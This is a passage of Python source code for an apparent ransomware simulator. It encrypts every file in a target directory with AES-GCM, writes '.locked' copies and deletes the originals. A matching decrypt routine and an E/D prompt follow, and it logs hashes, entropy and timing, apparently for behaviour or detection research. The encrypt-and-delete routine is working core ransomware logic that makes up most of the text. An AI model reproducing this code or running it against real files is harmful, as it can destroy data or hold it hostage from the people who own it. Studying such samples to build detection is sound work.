        path = os.path.join(TARGET_DIR, filename)
        with open(path, "rb") as f: data = f.read()
        
        start_time = time.time()
        nonce = os.urandom(12) 
        encrypted_data = aesgcm.encrypt(nonce, data, None)
        
        with open(path + ".locked", "wb") as f: f.write(nonce + encrypted_data)
        
        log_behavior("ENCRYPTION", {
            "file": filename,
            "orig_sha256": get_sha256(data),
            "orig_entropy": calculate_entropy(data),
            "enc_entropy": calculate_entropy(encrypted_data),
            "duration": time.time() - start_time
        })
        os.remove(path)
        print(f"[+] Encrypted: {filename}")

def decrypt_files():
    aesgcm = AESGCM(get_key())
    for filename in os.listdir(TARGET_DIR):
        if not filename.endswith(".locked"): continue
        path = os.path.join(TARGET_DIR, filename)
        with open(path, "rb") as f: 
            raw_data = f.read()
            nonce = raw_data[:12]
            encrypted_content = raw_data[12:]
        
        decrypted_data = aesgcm.decrypt(nonce, encrypted_content, None)
        original_path = path.replace(".locked", "")
        with open(original_path, "wb") as f: f.write(decrypted_data)
        
        log_behavior("DECRYPTION", {
            "file": original_path,
            "restored_sha256": get_sha256(decrypted_data)
        })
        os.remove(path)
        print(f"[-] Decrypted: {original_path}")

if __name__ == "__main__":
    choice = input("Enter 'E' to Encrypt or 'D' to Decrypt: ").upper()
    if choice == 'E': encrypt_files()
    elif choice == 'D': decrypt_files()
    else: print("Invalid Choice.")
